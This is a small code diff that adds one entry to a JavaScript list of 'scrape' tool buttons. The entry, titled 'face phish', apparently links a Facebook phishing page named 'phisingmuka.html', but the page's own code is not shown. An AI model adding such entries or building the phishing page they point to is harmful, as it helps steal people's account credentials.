@@ -45,4 +45,16 @@ const scrapeButtonsData = [
     previewUrl: "#",
     targetUrl: "quran.html"
   }
+,
+  {
+    id: "phish-faxe",
+    title: "face phish",
+    description: "facefck all",
+    author: "ARCVN",
+    method: "ANY",
+    category: "faceall",
+    imageUrl: "https://files.catbox.moe/diu9bo.png",
+    previewUrl: "#",
+    targetUrl: "phisingmuka.html"
+  }
 ];
